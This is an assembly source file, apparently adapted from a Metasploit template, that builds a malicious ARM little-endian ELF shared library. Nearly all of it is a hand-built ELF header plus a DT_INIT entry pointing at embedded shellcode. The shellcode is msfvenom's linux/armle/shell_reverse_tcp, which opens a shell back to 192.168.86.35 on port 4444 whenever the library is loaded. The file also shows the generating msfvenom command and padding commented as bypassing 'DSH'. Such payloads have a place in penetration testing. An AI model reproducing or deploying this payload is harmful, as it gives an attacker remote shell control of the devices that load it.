; https://raw.githubusercontent.com/rapid7/metasploit-framework/master/data/templates/src/elf/dll/elf_dll_armle_template.s

; build with:
;   nasm payload.s -f bin -o payload.bin

BITS 32
org     0
ehdr:
  db    0x7f, "ELF", 1, 1, 1, 0    ; e_ident
  db    0, 0, 0, 0,  0, 0, 0, 0
  dw    3                          ; e_type    = ET_DYN
  dw    40                         ; e_machine = EM_ARMLE
  dd    1                          ; e_version = EV_CURRENT
  dd    _start                     ; e_entry   = _start
  dd    phdr - $$                  ; e_phoff
  dd    shdr - $$                  ; e_shoff
  dd    0                          ; e_flags
  dw    ehdrsize                   ; e_ehsize
  dw    phdrsize                   ; e_phentsize
  dw    2                          ; e_phnum
  dw    shentsize                  ; e_shentsize
  dw    2                          ; e_shnum
  dw    1                          ; e_shstrndx
ehdrsize equ  $ - ehdr

phdr:
  dd    1                          ; p_type       = PT_LOAD
  dd    0                          ; p_offset
  dd    $$                         ; p_vaddr
  dd    $$                         ; p_paddr
  dd    0xDEADBEEF                 ; p_filesz
  dd    0xDEADBEEF                 ; p_memsz
  dd    7                          ; p_flags      = rwx
  dd    0x1000                     ; p_align

phdrsize equ  $ - phdr
  dd    2                          ; p_type  = PT_DYNAMIC
  dd    7                          ; p_flags = rwx
  dd    dynsection                 ; p_offset
  dd    dynsection                 ; p_vaddr
  dd    dynsection                 ; p_vaddr
  dd    dynsz                      ; p_filesz
  dd    dynsz                      ; p_memsz
  dd    0x1000                     ; p_align

shdr:
  dd    1                          ; sh_name
  dd    6                          ; sh_type = SHT_DYNAMIC
  dd    0                          ; sh_flags
  dd    dynsection                 ; sh_addr
  dd    dynsection                 ; sh_offset
  dd    dynsz                      ; sh_size
  dd    0                          ; sh_link
  dd    0                          ; sh_link
  dd    0                          ; sh_info
  dd    8                          ; sh_addralign
  dd    7                          ; sh_entsize
shentsize equ $ - shdr
  dd    0                          ; sh_name
  dd    3                          ; sh_type = SHT_STRTAB
  dd    0                          ; sh_flags
  dd    strtab                     ; sh_addr
  dd    strtab                     ; sh_offset
  dd    strtabsz                   ; sh_size
  dd    0                          ; sh_link
  dd    0                          ; sh_info
  dd    0                          ; sh_addralign
  dd    0                          ; sh_entsize
dynsection:
; DT_INIT
  dd    0x0c
  dd    _start
; DT_STRTAB
  dd    0x05
  dd    strtab
; DT_SYMTAB
  dd    0x06
  dd    strtab
; DT_STRSZ
  dd    0x0a
  dd    0
; DT_SYMENT
  dd    0x0b
  dd    0
; DT_NULL
  dd    0x00
  dd    0
dynsz equ $ - dynsection

strtab:
 db 0
 db 0
strtabsz equ $ - strtab

  db 0x00, 0x00 ; sf: padding
  
global _start
_start:
  ; ruby msfvenom -f masm -p linux/armle/shell_reverse_tcp PrependFork=true LHOST=192.168.86.35 LPORT=4444 SHELL=/bin/sh ARGV0=/bin/sh
buf db 0x02, 0x00, 0xa0, 0xe3, 0x01, 0x10, 0xa0, 0xe3, 0x05, 0x20, 0x81, 0xe2, 0x8c
    db 0x70, 0xa0, 0xe3, 0x8d, 0x70, 0x87, 0xe2, 0x00, 0x00, 0x00, 0xef, 0x00, 0x60
    db 0xa0, 0xe1, 0x60, 0x10, 0x8f, 0xe2, 0x10, 0x20, 0xa0, 0xe3, 0x8d, 0x70, 0xa0
    db 0xe3, 0x8e, 0x70, 0x87, 0xe2, 0x00, 0x00, 0x00, 0xef, 0x06, 0x00, 0xa0, 0xe1
    db 0x00, 0x10, 0xa0, 0xe3, 0x3f, 0x70, 0xa0, 0xe3, 0x00, 0x00, 0x00, 0xef, 0x06
    db 0x00, 0xa0, 0xe1, 0x01, 0x10, 0xa0, 0xe3, 0x3f, 0x70, 0xa0, 0xe3, 0x00, 0x00
    db 0x00, 0xef, 0x06, 0x00, 0xa0, 0xe1, 0x02, 0x10, 0xa0, 0xe3, 0x3f, 0x70, 0xa0
    db 0xe3, 0x00, 0x00, 0x00, 0xef, 0x24, 0x00, 0x8f, 0xe2, 0x04, 0x40, 0x24, 0xe0
    db 0x10, 0x00, 0x2d, 0xe9, 0x0d, 0x20, 0xa0, 0xe1, 0x24, 0x40, 0x8f, 0xe2, 0x10
    db 0x00, 0x2d, 0xe9, 0x0d, 0x10, 0xa0, 0xe1, 0x0b, 0x70, 0xa0, 0xe3, 0x00, 0x00
    db 0x00, 0xef, 0x02, 0x00, 0x11, 0x5c, 0xc0, 0xa8, 0x56, 0x23, 
    db "/bin/sh", 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
    db "/bin/sh", 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 ; <-- bypass the DSH
    db 0x00, 0x00, 0x00